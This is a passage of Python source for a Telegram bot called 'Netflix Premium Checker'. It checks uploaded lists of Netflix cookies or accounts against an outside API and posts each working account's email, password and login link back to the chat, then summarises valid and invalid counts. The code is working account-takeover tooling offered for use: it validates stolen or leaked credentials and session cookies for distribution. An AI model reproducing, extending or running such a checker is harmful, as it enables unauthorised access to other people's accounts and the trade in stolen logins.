━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 **{lang['email']}:** `{account['email']}`
🔑 **{lang['password']}:** `{account.get('password', 'N/A')}`
{details_str}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔗 **{lang['login_link']}:**
`{result['login_url']}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ **{lang['powered_by']} {YOUR_CREDIT}** ✨
                """
                
                keyboard = [[InlineKeyboardButton(lang['launch'], url=result['login_url'])]]
                await update.message.reply_text(
                    msg,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode='Markdown'
                )
                
            else:
                invalid_count += 1
                invalid_accounts += 1
                error_code = result.get('error_code', 'UNKNOWN')
                error_counts[error_code] += 1
            
            await asyncio.sleep(0.5)
        
        # Beautiful final summary
        success_rate = valid_count/len(accounts)*100 if len(accounts) > 0 else 0
        
        if valid_count > 0:
            summary = f"""
╔══════════════════════════════════════════╗
║     ✅ **{lang['complete']}** ✅     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **{lang['results']}:**

✨ **{lang['valid_found']}:** `{valid_count}`
💫 **{lang['success_rate']}:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Valid accounts have been sent above!**

⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """
        else:
            summary = f"""
╔══════════════════════════════════════════╗
║     ❌ **{lang['no_valid']}** ❌     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **{lang['results']}:**

❌ **{lang['invalid_found']}:** `{invalid_count}`
📈 **Error Breakdown:**

"""
            for error, count in error_counts.items():
                summary += f"   • `{error}`: {count}\n"
            
            summary += f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 **Note:** 'INVALID_RESPONSE_FORMAT' means
    the Netflix cookie has expired.

⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """
        
        await progress_msg.edit_text(summary, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await progress_msg.edit_text(
            f"""
╔══════════════════════════════════════════╗
║     ❌ **{lang['error_occurred']}** ❌     ║
╚══════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❌ **Error:** `{str(e)[:100]}`

💡 Please try again or check file format

⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )

# ==================== RATE LIMITING ====================

def check_rate_limit(user_id, limit=5, period=60):
    now = time.time()
    rate_limits[user_id] = [t for t in rate_limits[user_id] if now - t < period]
    if len(rate_limits[user_id]) >= limit:
        return False
    rate_limits[user_id].append(now)
    return True

# ==================== MAIN FUNCTION ====================

async def run_bot():
    """Run the bot"""
    print("=" * 60)
    print("🎬 NETFLIX PREMIUM CHECKER BOT")
    print("=" * 60)
    print(f"✅ Bot Token: {TOKEN[:10]}...")
    print(f"✅ YOUR API: {API_URL}")
    print(f"✅ Credit: {YOUR_CREDIT}")
    print("=" * 60)
    print("🌐 Languages: English, 中文, ខ្មែរ")
    print("📁 Supports multiple formats")
    print("🔍 New: /check command for single cookies")
    print("🎨 Beautiful Premium Output")
    print("=" * 60)
    
    app = Application.builder().token(TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CommandHandler("language", language_command))
    app.add_handler(CommandHandler("check", check_command))  # NEW COMMAND
    app.add_handler(CallbackQueryHandler(language_callback, pattern="^lang_"))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    
    print("✅ Bot is running! Send a .txt file or use /check command to test.")
    print("=" * 60)
    
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

def main():
    """Main entry point"""
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == '__main__':
    main()
